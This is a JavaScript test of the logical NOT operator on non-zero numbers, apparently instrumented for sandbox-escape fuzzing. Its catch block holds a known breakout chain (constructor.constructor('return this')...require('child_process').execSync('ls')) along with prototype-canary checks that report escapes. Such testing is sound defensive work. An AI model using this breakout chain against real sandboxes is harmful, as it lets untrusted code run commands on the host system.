try {
    if (!Number.POSITIVE_INFINITY !== false) {
        $ERROR('#1: !(+Infinity) === false. Actual: ' + !+Infinity);
    }
    if (!Number.NEGATIVE_INFINITY !== false) {
        $ERROR('#2: !(-Infinity) === false. Actual: ' + !-Infinity);
    }
    if (!Number.MAX_VALUE !== false) {
        $ERROR('#3: !(Number.MAX_VALUE) === false. Actual: ' + !Number.MAX_VALUE);
    }
    if (!Number.MIN_VALUE !== false) {
        $ERROR('#4: !(Number.MIN_VALUE) === false. Actual: ' + !Number.MIN_VALUE);
    }
    if (!13 !== false) {
        $ERROR('#5: !(13) === false. Actual: ' + !13);
    }
    if (!-13 !== false) {
        $ERROR('#6: !(-13) === false. Actual: ' + !-13);
    }
    if (!1.3 !== false) {
        $ERROR('#7: !(1.3) === false. Actual: ' + !1.3);
    }
    if (!-1.3 !== false) {
        $ERROR('#8: !(-1.3) === false. Actual: ' + !-1.3);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}